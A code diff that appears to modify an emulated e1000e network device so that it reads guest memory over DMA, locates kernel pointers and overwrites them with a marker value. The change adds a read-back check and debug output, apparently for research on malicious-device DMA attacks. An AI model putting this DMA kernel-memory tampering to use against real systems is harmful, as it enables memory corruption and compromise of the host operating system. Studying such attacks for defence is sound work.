@@ -3889,7 +3889,7 @@ mangle_kernel_pointers(E1000ECore *core, dma_addr_t descriptor_addr,
 	void *opaque)
 {
 	int read_result;
-	uint64_t page_address;
+	uint64_t page_address, kernel_pointer_address;
 	struct e1000_tx_desc desc;
 	uint8_t page[4096];
 	pci_dma_read(core->owner, descriptor_addr, &desc, sizeof(desc));
@@ -3902,7 +3902,7 @@ mangle_kernel_pointers(E1000ECore *core, dma_addr_t descriptor_addr,
 	read_result = perform_dma_long_read(page, 4096, core->owner->devfn, 8,
 		page_address);
 
-	uint64_t deadbeef = cpu_to_le64(0xDEADBEEFBEDEDEAD);
+	uint64_t little_buffer, deadbeef = cpu_to_le64(0xDEADBEEFBEDEDEAD);
 
 	int kernel_pointer_location = -4;
 
@@ -3913,15 +3913,24 @@ mangle_kernel_pointers(E1000ECore *core, dma_addr_t descriptor_addr,
 			if (kernel_pointer_location == -1) {
 				break;
 			} else {
-				putchar('m');
-				fflush(stdout);
-				perform_dma_write((uint8_t *)&deadbeef, sizeof(deadbeef), 8, 0,
-					desc.buffer_addr + (kernel_pointer_location - 4));
+				kernel_pointer_address = page_address | kernel_pointer_location;
+				/*putchar('m');*/
+				/*fflush(stdout);*/
+				printf("kp 0x%lx.\n", kernel_pointer_address);
+				perform_dma_write((uint8_t *)&deadbeef, sizeof(deadbeef),
+					core->owner->devfn, 8, kernel_pointer_address);
+				perform_dma_read((uint8_t *)&little_buffer,
+					sizeof(little_buffer), core->owner->devfn, 8,
+					kernel_pointer_address);
+				if (little_buffer != deadbeef) {
+					printf("Wrote 0x%lx to 0x%lx, but read 0x%lx.\n",
+						kernel_pointer_address, deadbeef, little_buffer);
+				}
 			}
 		}
 	} else {
 		putchar('e');
-		printf("pa 0x%x.\n", page_address);
+		printf("pa 0x%lx.\n", page_address);
 		fflush(stdout);
 	}
 }
